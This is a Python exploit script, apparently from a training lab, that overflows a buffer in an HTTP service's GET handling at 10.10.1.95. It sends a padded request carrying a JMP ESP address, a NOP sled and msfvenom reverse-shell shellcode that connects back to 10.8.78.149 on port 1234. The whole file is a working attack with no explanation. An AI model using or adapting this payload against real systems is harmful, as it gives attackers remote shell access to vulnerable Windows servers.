import socket,sys
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('10.10.1.95',80))


evil = "GET"
evil += "A" * 1788 
evil += "\x71\xE8\xF1\x77" #JMP_ESP
evil += "\x90" * 16 #NOPS
#msfvenom -p windows/shell_reverse_tcp lhost=10.8.78.149 lport=1234 -a x86 -f python -b "\x00\x0D"


evil += b"\xda\xce\xb8\x2f\xdd\x73\x14\xd9\x74\x24\xf4\x5a\x29"
evil += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x6d\xce\x91"
evil += b"\xe1\x8d\x18\xd7\x0a\x6d\xd9\xb8\x83\x88\xe8\xf8\xf0"
evil += b"\xd9\x5b\xc9\x73\x8f\x57\xa2\xd6\x3b\xe3\xc6\xfe\x4c"
evil += b"\x44\x6c\xd9\x63\x55\xdd\x19\xe2\xd5\x1c\x4e\xc4\xe4"
evil += b"\xee\x83\x05\x20\x12\x69\x57\xf9\x58\xdc\x47\x8e\x15"
evil += b"\xdd\xec\xdc\xb8\x65\x11\x94\xbb\x44\x84\xae\xe5\x46"
evil += b"\x27\x62\x9e\xce\x3f\x67\x9b\x99\xb4\x53\x57\x18\x1c"
evil += b"\xaa\x98\xb7\x61\x02\x6b\xc9\xa6\xa5\x94\xbc\xde\xd5"
evil += b"\x29\xc7\x25\xa7\xf5\x42\xbd\x0f\x7d\xf4\x19\xb1\x52"
evil += b"\x63\xea\xbd\x1f\xe7\xb4\xa1\x9e\x24\xcf\xde\x2b\xcb"
evil += b"\x1f\x57\x6f\xe8\xbb\x33\x2b\x91\x9a\x99\x9a\xae\xfc"
evil += b"\x41\x42\x0b\x77\x6f\x97\x26\xda\xf8\x54\x0b\xe4\xf8"
evil += b"\xf2\x1c\x97\xca\x5d\xb7\x3f\x67\x15\x11\xb8\x88\x0c"
evil += b"\xe5\x56\x77\xaf\x16\x7f\xbc\xfb\x46\x17\x15\x84\x0c"
evil += b"\xe7\x9a\x51\x82\xb7\x34\x0a\x63\x67\xf5\xfa\x0b\x6d"
evil += b"\xfa\x25\x2b\x8e\xd0\x4d\xc6\x75\xb3\x7b\x1f\x3b\xd6"
evil += b"\x14\x1d\xc3\xdc\x36\xa8\x25\xb6\xa6\xfd\xfe\x2f\x5e"
evil += b"\xa4\x74\xd1\x9f\x72\xf1\xd1\x14\x71\x06\x9f\xdc\xfc"
evil += b"\x14\x48\x2d\x4b\x46\xdf\x32\x61\xee\x83\xa1\xee\xee"
evil += b"\xca\xd9\xb8\xb9\x9b\x2c\xb1\x2f\x36\x16\x6b\x4d\xcb"
evil += b"\xce\x54\xd5\x10\x33\x5a\xd4\xd5\x0f\x78\xc6\x23\x8f"
evil += b"\xc4\xb2\xfb\xc6\x92\x6c\xba\xb0\x54\xc6\x14\x6e\x3f"
evil += b"\x8e\xe1\x5c\x80\xc8\xed\x88\x76\x34\x5f\x65\xcf\x4b"
evil += b"\x50\xe1\xc7\x34\x8c\x91\x28\xef\x14\xa1\x62\xad\x3d"
evil += b"\x2a\x2b\x24\x7c\x37\xcc\x93\x43\x4e\x4f\x11\x3c\xb5"
evil += b"\x4f\x50\x39\xf1\xd7\x89\x33\x6a\xb2\xad\xe0\x8b\x97"



evil += "HTTP/1.1\r\n\r\n"
sock.send(evil)
sock.close()